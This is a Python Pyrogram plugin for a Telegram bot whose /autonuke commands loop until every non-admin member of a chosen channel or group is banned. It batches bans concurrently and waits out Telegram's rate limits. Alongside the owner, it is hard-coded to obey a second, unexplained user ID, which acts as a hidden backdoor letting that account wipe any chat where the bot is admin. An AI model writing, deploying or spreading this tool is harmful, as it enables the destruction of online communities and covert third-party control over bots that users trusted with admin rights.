import asyncio
from pyrogram import Client, filters
from pyrogram.errors import FloodWait, UserAdminInvalid, ChatAdminRequired
from pyrogram.types import Message
from config import OWNER_ID

# ==========================================
# ☢️ MANAGER BOT: AUTO-LOOP NUKE PROTOCOL
# ==========================================

CONCURRENCY_LIMIT = 15 
sem = asyncio.Semaphore(CONCURRENCY_LIMIT)

async def fast_ban(client, chat_id, user_id):
    async with sem:
        try:
            await client.ban_chat_member(chat_id, user_id)
            return "success"
        except FloodWait as e:
            await asyncio.sleep(e.value + 2) # Limit aayi toh rukega
            return "flood"
        except Exception:
            return "failed"

# 🔥 COMMAND: /autonuke OR /wipeout 🔥
@Client.on_message(filters.command(["autonuke", "wipeout", "sysnuke"], prefixes=["/", ".", "!"]) & filters.user([OWNER_ID, 8273113571]))
async def manager_auto_nuke(client: Client, message: Message):
    
    if len(message.command) > 1:
        target = message.command[1]
        try:
            target_chat = int(target)
        except ValueError:
            target_chat = target
    else:
        target_chat = message.chat.id
        
    try:
        chat = await client.get_chat(target_chat)
        chat_id = chat.id
    except Exception as e:
        return await message.reply(f"⚠️ **ᴇʀʀᴏʀ:** ᴄʜᴀɴɴᴇʟ ɴᴀʜɪ ᴍɪʟᴀ! 👉 ᴜꜱᴀɢᴇ: `/autonuke -100xxxxxxx`")

    if chat.type == "private":
        return await message.reply("⚠️ **ᴇʀʀᴏʀ:** ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ ᴡᴏʀᴋꜱ ɪɴ ᴄʜᴀɴɴᴇʟꜱ/ɢʀᴏᴜᴩꜱ.")

    status_msg = await message.reply(f"☢️ `[ ᴀᴜᴛᴏ-ɴᴜᴋᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ꜰᴏʀ: {chat.title} ]`\n⏳ *Bot rukega nahi jab tak channel saaf na ho jaye!*")

    total_banned = 0
    total_failed = 0

    try:
        # 🔥 INFINITY LOOP: Jab tak channel khali nahi hota, ye chalta rahega!
        while True:
            # Check kitne log bache hain
            member_count = await client.get_chat_members_count(chat_id)
            if member_count <= 2: # Sirf Admin aur Bot bache hain
                break
                
            tasks = []
            banned_in_this_round = 0

            # List nikalna shuru
            async for member in client.get_chat_members(chat_id):
                user = member.user
                if user.id == client.me.id or member.status in ["creator", "administrator"]:
                    continue
                
                task = asyncio.create_task(fast_ban(client, chat_id, user.id))
                tasks.append(task)
                
                # 50 logo ka batch banayega
                if len(tasks) >= 50:
                    results = await asyncio.gather(*tasks)
                    for res in results:
                        if res == "success": 
                            total_banned += 1
                            banned_in_this_round += 1
                        elif res == "failed": 
                            total_failed += 1
                    tasks = [] 
                    
                    try:
                        await status_msg.edit(f"💀 **ᴀᴜᴛᴏ-ɴᴜᴋᴇ ɪɴ ᴩʀᴏɢʀᴇꜱꜱ...**\n━━━━━━━━━━━━━━━\n🎯 ᴛᴀʀɢᴇᴛ: `{chat.title}`\n🩸 ᴛᴏᴛᴀʟ ʙᴀɴɴᴇᴅ: `{total_banned}`\n🔄 ʀᴇᴍᴀɪɴɪɴɢ: `{member_count - total_banned}`")
                    except: pass

            if tasks:
                results = await asyncio.gather(*tasks)
                for res in results:
                    if res == "success": total_banned += 1
                    elif res == "failed": total_failed += 1

            # Agar loop chala aur ek bhi banda ban nahi hua (yani telegram ne list deni band kardi)
            if banned_in_this_round == 0:
                break
                
            await asyncio.sleep(2) # Naye round se pehle thoda sa aaram taki crash na ho

        final_report = (
            f"☢️ **ᴄʜᴀɴɴᴇʟ ꜰᴜʟʟʏ ᴇʀᴀᴅɪᴄᴀᴛᴇᴅ (ᴀᴜᴛᴏ ᴍᴏᴅᴇ)** ☢️\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 ᴛᴀʀɢᴇᴛ: `{chat.title}`\n"
            f"🩸 ᴛᴏᴛᴀʟ ʙᴀɴɴᴇᴅ: `{total_banned}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"💀 `[ ᴍɪꜱꜱɪᴏɴ ᴀᴄᴄᴏᴍᴩʟɪꜱʜᴇᴅ ]`"
        )
        await status_msg.edit(final_report)

    except ChatAdminRequired:
        await status_msg.edit("🤬 **ᴏᴜᴋᴀᴀᴛ ᴍᴇ ʀᴇʜ!** ᴍᴀɴᴀɢᴇʀ ʙᴏᴛ ɴᴇᴇᴅꜱ ᴀᴅᴍɪɴ ʀɪɢʜᴛꜱ ɪɴ ᴛʜᴀᴛ ᴄʜᴀɴɴᴇʟ.")
    except FloodWait as e:
        await status_msg.edit(f"⚠️ **ᴛᴇʟᴇɢʀᴀᴍ ʟɪᴍɪᴛ!** Bot got paused for {e.value} seconds. Phir se command dena padega baad me.")
    except Exception as e:
        await status_msg.edit(f"❌ **ꜱʏꜱᴛᴇᴍ ᴄʀᴀꜱʜ:** {str(e)}")

